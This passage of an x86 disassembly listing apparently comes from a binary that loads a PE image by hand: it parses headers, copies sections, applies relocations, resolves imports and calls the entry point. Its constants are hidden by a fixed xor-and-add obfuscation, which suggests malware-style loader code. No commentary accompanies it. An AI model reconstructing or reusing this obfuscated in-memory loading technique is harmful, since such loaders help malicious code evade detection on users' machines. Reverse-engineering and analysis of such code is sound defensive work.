  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
